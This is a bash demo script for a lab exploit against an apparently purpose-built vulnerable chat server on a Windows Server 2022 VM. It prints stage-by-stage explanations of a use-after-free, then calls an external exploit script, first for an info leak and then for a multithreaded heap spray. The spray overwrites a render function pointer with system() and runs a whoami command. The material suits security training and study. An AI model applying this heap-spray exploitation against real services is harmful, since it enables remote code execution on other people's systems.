#!/bin/bash
# UAF demo. run after overflow.sh or standalone (after setup.sh).
# restarts chatd if the overflow killed it.
cd "$(dirname "$0")/.."

VM_IP="192.168.121.32"

wait_key() { echo ""; read -rp "  [enter] "; }

clear
cat <<'BANNER'

  binex-vulnchat: use-after-free via heap spray (windows)
  -------------------------------------------------------

  target     chatd.exe on Windows Server 2022
  vuln       /repeat dereferences freed last_msg pointer
  struct     chat_msg (216 bytes), render() function ptr at +144
  primitive  heap spray overwrites render with attacker-controlled addr
  threads    server is threaded, not forked (shared heap = cross-client spray)

BANNER

wait_key

# bring chatd back if the overflow took it down
vagrant winrm win -c '
$p = Get-Process chatd -ErrorAction SilentlyContinue
if (-not $p) {
    ([wmiclass]"Win32_Process").Create("C:\chatd\chatd.exe -k C:\chatd\idp_ed25519.pk -p 4002", "C:\chatd", $null) | Out-Null
    Start-Sleep 2
    Write-Host "  chatd restarted (was dead from overflow)"
} else {
    Write-Host "  chatd running (PID $($p.Id))"
}
' 2>/dev/null

wait_key

echo "  stage 1: info leak (reading freed memory)"
echo ""
echo "  /help sets last_msg, server frees it, /repeat reads stale data."
echo "  if the freed chunk hasn't been reused, we get stale heap contents."
echo "  if it has, we get whatever the new occupant wrote there."
echo ""

python3 exploits/chat_win_uaf.py \
  --host $VM_IP --port 4002 \
  --auth-host 127.0.0.1 --auth-port 4001 \
  --info-leak

wait_key

# chatd probably crashed from the info leak dereference
vagrant winrm win -c '
$p = Get-Process chatd -ErrorAction SilentlyContinue
if (-not $p) {
    ([wmiclass]"Win32_Process").Create("C:\chatd\chatd.exe -k C:\chatd\idp_ed25519.pk -p 4002", "C:\chatd", $null) | Out-Null
    Start-Sleep 2
    Write-Host "  chatd restarted for spray stage"
} else {
    Write-Host "  chatd still alive"
}
' 2>/dev/null

echo ""
echo "  stage 2: heap spray (corrupting render pointer)"
echo ""
echo "  12 threads spray /me with 215-byte bodies."
echo "  each body places system() at offset 144 (the render ptr slot)."
echo "  when /repeat calls render(), it jumps to our address."
echo ""
echo "  on native windows, LFH randomizes bucket layout."
echo "  the crash proves the vuln. code exec needs LFH-tuned grooming."
echo ""

python3 exploits/chat_win_uaf.py \
  --host $VM_IP --port 4002 \
  --auth-host 127.0.0.1 --auth-port 4001 \
  --ucrt-base 0x7FFEAE740000 \
  --profile ws2022_ucrt \
  --cmd "whoami > C:\\chatd\\uaf_pwned.txt" \
  --spray-threads 12 --spray-rounds 100 \
  --attempts 3

echo ""
echo "  done. freed pointer dereference demonstrated."
echo ""
